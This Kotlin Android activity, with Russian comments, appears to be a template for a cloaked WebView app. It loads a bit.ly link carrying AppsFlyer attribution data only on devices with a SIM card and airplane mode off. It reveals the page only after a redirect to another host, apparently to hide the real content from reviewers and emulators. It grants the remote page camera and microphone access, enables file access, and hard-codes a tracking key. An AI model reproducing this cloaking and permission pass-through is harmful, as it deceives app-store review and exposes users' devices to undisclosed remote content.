package org.application.example

import android.Manifest.permission.*
import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.net.Uri
import android.os.Build
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.provider.Settings
import android.provider.Settings.Global.AIRPLANE_MODE_ON
import android.telephony.TelephonyManager
import android.view.KeyEvent
import android.view.View
import android.webkit.*
import android.widget.Toast
import androidx.core.app.ActivityCompat
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.onesignal.OneSignal
import java.net.URLEncoder
import java.util.*

class MainActivity : AppCompatActivity() {
	private lateinit var webView: WebView

	private var valueCallback: ValueCallback<Array<Uri>?>? = null
	private var ready = false

	private fun Context.isAirplaneModeOn(): Boolean = Settings.System.getInt(
		contentResolver,
		AIRPLANE_MODE_ON, 0
	) !== 0


	@SuppressLint("ServiceCast")
	fun isSimSupport(context: Context): Boolean {
		val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
		return tm.simState != TelephonyManager.SIM_STATE_ABSENT
	}

	@SuppressLint("SetJavaScriptEnabled")
	override fun onCreate(savedInstanceState: Bundle?) {
		super.onCreate(savedInstanceState)
		setContentView(R.layout.activity_main)

		webView = findViewById(R.id.app_webview)

		webView.settings.apply {
			useWideViewPort = true
			javaScriptCanOpenWindowsAutomatically = true
			databaseEnabled = true
			domStorageEnabled = true
			javaScriptEnabled = true
			displayZoomControls = true
			cacheMode = WebSettings.LOAD_DEFAULT
			mediaPlaybackRequiresUserGesture = false

			allowContentAccess = true
			allowFileAccess = true

			setSupportMultipleWindows(false)
		}

		webView.setOnKeyListener { v: View, keyCode: Int, event: KeyEvent ->
			(v as WebView).apply {
				if (
					event.action == KeyEvent.ACTION_DOWN &&
					keyCode == KeyEvent.KEYCODE_BACK &&
					v.canGoBack()
				) {
					v.goBack()

					return@setOnKeyListener true
				}
			}

			false
		}

		webView.webViewClient = object : WebViewClient() {

			@SuppressLint("ObsoleteSdkInt")
			override fun onPageFinished(view: WebView?, url: String?) {
				super.onPageFinished(view, url)

				if (Build.VERSION.SDK_INT >= 21) {
					CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true)
				} else {
					CookieManager.getInstance().setAcceptCookie(true)
				}

				val urlHost = Uri.parse("https://bit.ly/3NpZXKc").host
				val urlStarted = Uri.parse(url!!).host

				if (!urlHost.equals("file://") && urlHost != "" && urlStarted != "") {
					if (!urlHost.equals(urlStarted)) {
						if (!"cloudflare".contains(view?.title.toString())) {
							view?.visibility = View.VISIBLE
						}
					}
				}
			}

			@SuppressLint("ObsoleteSdkInt")
			override fun onPageStarted(view: WebView?, url: String?, favicon: Bitmap?) {
				super.onPageStarted(view, url, favicon)

				if (Build.VERSION.SDK_INT >= 21) {
					CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true)
				} else {
					CookieManager.getInstance().setAcceptCookie(true)
				}
			}

			override fun doUpdateVisitedHistory(view: WebView?, url: String?, isReload: Boolean) {
				super.doUpdateVisitedHistory(view, url, isReload)

				val action = Uri.parse(url).path
					?.replace("-", "/")
					?.replace(".", "/")
					?.replace("_", "/")
					?.replace(",", "/")
					?.split("/")
					?.filterNot { it.isEmpty() }
					?.joinToString("") {
						it.capitalize(Locale.ROOT)
					}
					?.take(32)

				runOnUiThread {
					if (action != null) {
						OneSignal.sendTag(action, action)
					}
				}
			}
		}

		// Добавим поддержку файлов, камеры и микрофона в WebChrome, не забудьте скопировать так же функции onActivityResult и onRequestPermissionsResult
		webView.webChromeClient = object : WebChromeClient() {

			// Добавляем доступ к камере и микрофону из вебвью
			override fun onPermissionRequest(request: PermissionRequest?) {
				if (
					ActivityCompat.checkSelfPermission(this@MainActivity, CAMERA) != PackageManager.PERMISSION_GRANTED||
					ActivityCompat.checkSelfPermission(this@MainActivity, RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED
				) {
					ActivityCompat.requestPermissions(this@MainActivity, arrayOf(CAMERA, RECORD_AUDIO), 102)
				} else {
					request?.grant(request.resources)
				}
			}

			// Добавляем доступ к файлам из вебвью
			override fun onShowFileChooser(
				vw: WebView?, filePathCallback: ValueCallback<Array<Uri>?>?,
				fileChooserParams: FileChooserParams?
			): Boolean {
				valueCallback?.onReceiveValue(null)
				valueCallback = filePathCallback

				val i = Intent(Intent.ACTION_GET_CONTENT).also { intent ->
					intent.addCategory(Intent.CATEGORY_OPENABLE)
					intent.type = "image/*"
				}

				startActivityForResult(Intent.createChooser(i, "File"), 12)

				return true
			}
		}


		AppsFlyerLib
			.getInstance()
			.apply {

				OneSignal
					.setExternalUserId(
						AppsFlyerLib
							.getInstance()
							.getAppsFlyerUID(applicationContext)
					)

				// Для теста используется ключ SihipwKzzzxbpG3LoUhuPn
				init("SihipwKzzzxbpG3LoUhuPn", object : AppsFlyerConversionListener {
					override fun onConversionDataSuccess(p0: MutableMap<String, Any>?) {
						runOnUiThread {
							val query = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
								p0!!.map { p ->
									val pair =
										URLEncoder.encode(p.key, "utf-8") to
											URLEncoder.encode(p.value.toString(), "utf-8")

									pair.first.plus("=").plus(pair.second)
								}.joinToString("&")
							} else { "" }

							if (isSimSupport(applicationContext) && !isAirplaneModeOn() && !ready) {
								ready = true

								webView.loadUrl("https://bit.ly/3NpZXKc".plus("?$query"))
							}
						}
					}

					override fun onConversionDataFail(p0: String?) {}
					override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
					override fun onAttributionFailure(p0: String?) {}
				}, applicationContext)

				enableFacebookDeferredApplinks(true)

				start(applicationContext)
			}
	}

	// Когда файл выбран, отдаем его в веб вью
	override fun onActivityResult(requestCode: Int, resultCode: Int, intent: Intent?) {
		super.onActivityResult(requestCode, resultCode, intent)

		if (resultCode != RESULT_CANCELED) {
			valueCallback?.onReceiveValue(arrayOf(Uri.parse(intent!!.dataString)))
		}
		else {
			valueCallback?.onReceiveValue(null)
		}

		valueCallback = null
	}

	// Права на доступ к камере получены
	override fun onRequestPermissionsResult(
		requestCode: Int,
		permissions: Array<out String>,
		grantResults: IntArray
	) {
		super.onRequestPermissionsResult(requestCode, permissions, grantResults)

		if (requestCode == 102) {
			webView.reload()
		}
	}
}